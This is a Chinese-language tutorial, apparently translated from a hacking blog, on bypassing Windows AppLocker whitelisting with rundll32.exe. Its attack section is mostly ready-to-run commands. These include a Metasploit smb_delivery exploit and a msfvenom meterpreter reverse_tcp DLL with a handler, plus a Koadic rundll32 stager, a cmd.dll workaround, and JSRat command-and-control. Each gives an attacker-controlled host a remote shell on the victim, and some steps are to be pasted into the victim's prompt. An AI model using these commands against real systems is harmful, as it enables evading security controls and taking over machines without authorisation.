## 使用rundll32.exe绕过应用程序白名单（多种方法）

### 介绍 [^1]

### DLL文件的工作 [^2]

### 好处

- 使用更少的资源
- 促进模块化架构
- 简化部署和安装

### 缺点

- 依赖DLL将升级到新版本
- 依赖DLL是固定的
- 依赖DLL将被早期版本覆盖
- 从计算机中删除从属DLL

### 使用DLL文件的AppLocker Bypass的不同方法

- Smb_Delivery

  - ```bash
    msfconsole
    use exploit/windows/smb/smb_delivery
    set srvhost 192.168.1.110
    exploit
    rundll32.exe \\192.168.1.107\ZtmW\test.dll,0 #当上述漏洞利用程序运行时，它将为您提供一个在受害者的PC上执行的命令。在受害主机cmd运行
    sessions
    ```

- MSFVenom

  - ```bash
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f dll > 1.dll
    rundll32 shell32.dll,Control_RunDLL C:\Users\raj\Downloads\1.dll #受害主机cmd运行
    # 键入以下命令启动multi / handler以获取会话
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.107
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit
    ```

- Koadic

  - ```bash
    use stager/js/rundll32_js
    set SRVHOST 192.168.1.107
    run
    # 当上述漏洞利用程序运行时，它将为您提供一个在受害者的PC上执行的命令
    # 并将其粘贴到受害者PC的命令提示符中并运行
    zombies 0
    ```

- 通过`cmd.dll`获取命令提示符 [软件下载地址](http://didierstevens.com/files/software/cmd-dll_v0_0_4.zip)

  - ```bash
    # 应用场景是目标主机因Applocker策略禁用cmd.exe
    # 将该软件上传到目标主机，并解压执行
    rundll32 shell32.dll,Control_RunDLL C:\Users\raj\Downloads\cmd.dll 
    ```

- JSRat [^3]

  - ```bash
    ./JSRat.py -i 192.168.1.107 -p 4444
    # 一旦JSRat开始工作，它将为您提供在浏览器中打开的链接。该网页将有一个代码，该代码将在受害者的电脑上执行
    http://192.168.1.107/wtf #浏览器打开
    # 复制其中的代码并在受害者PC的命令提示符中运行该代码
    ```

### 结论 [^4]

[原文](https://www.hackingarticles.in/bypass-application-whitelisting-using-rundll32-exe-multiple-methods/)

---

[^1]: DLL文件对于窗口的操作系统非常重要，它还决定了自定义窗口的其他程序的工作。动态链接库（DLL）文件是一种文件类型，它向其他程序提供有关如何调用某些内容的指令。因此，多个软件可以共享这样的DLL文件，甚至可以同时共享。尽管与.exe文件的格式相同，但DLL文件不能像.exe文件那样直接执行。DLL文件扩展名可以是：.dll（动态链接库）,. OCX（ActiveX控件）,. CPL（控制面板）,. DRV（设备驱动程序）
[^2]: 在使用时，DLL文件分为几个部分。这使得DLL文件的工作变得简单快捷。每个部分都在运行时安装在主程序中。由于每个部分都不同且独立; 加载时间更快，并且仅在需要所述文件的功能时才完成。此功能还使升级更容易应用，而不会影响其他部分。例如，你有一个字典程序，每个月都会添加新单词，所以你需要做的就是更新它; 无需为它安装另一个程序
[^3]: 我们下一步攻击regsvr32的方法是使用JSRat，你可以从**[GitHub](https://github.com/Hood3dRob1n/JSRat-Py)**下载它  。这是另一个命令和控制框架，就像koadic和Powershell Empire一样，只为rundll32.exe和regsvr32.exe生成恶意任务。JSRat将创建一个Web服务器，在该Web服务器上，我们将找到我们的.js文件
[^4]: LL文件是各种代码和过程的集合。这些文件可以帮助Windows程序准确执行。这些文件是为多个程序创建的，可以同时使用它们。这种技术有助于记忆保存。因此，这些文件很重要，并且要求Windows正常运行而不会给用户带来任何问题。因此，通过这些文件进行利用是非常有效和致命的。以上介绍的方法是不同的方法。